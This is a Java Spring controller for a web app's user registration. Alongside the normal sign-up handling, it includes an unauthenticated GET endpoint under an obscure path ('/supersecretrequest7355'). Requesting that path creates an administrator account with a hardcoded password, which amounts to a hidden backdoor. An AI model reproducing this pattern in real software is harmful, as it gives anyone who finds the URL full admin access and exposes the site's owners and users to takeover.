package web.client.Controllers;


import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import web.client.User;
import web.client.Services.UserService;


import javax.validation.Valid;

@Controller
public class UserController {

    private UserService service;

    @Autowired
    public void setService(UserService service) {
        this.service = service;
    }
    @Autowired
    UserService userService;


    @GetMapping("/registration")
    public String registration(Model model) {
        model.addAttribute("user", new User());
        return "user/registration";
    }

    @GetMapping("/supersecretrequest7355")
    public String addAdmin(Model model) {
        User user = new User("admin", "admin", "admin", "ggg", "address", "password", "a@b.c","Role_Admin");
        user.setRoles("ROLE_Admin");
        user.setPassword(new BCryptPasswordEncoder().encode("74553211"));
        service.saveUser(user);

        return "redirect:/entrance";
    }

    @PostMapping("/registration")
    public String validateEntrance(@Valid User user, BindingResult result) {
        if (result.hasErrors()) {
            return "user/registration";
        }

        for(User u : service.getAllUsers()) {
            if(u.getUsername().equals(user.getUsername())) {
                return "user/registration";
            }
        }
        user.setRoles("ROLE_Client");
        user.setPassword(new BCryptPasswordEncoder().encode(user.getPassword()));
        service.saveUser(user);
        return "redirect:/entrance";
    }
}
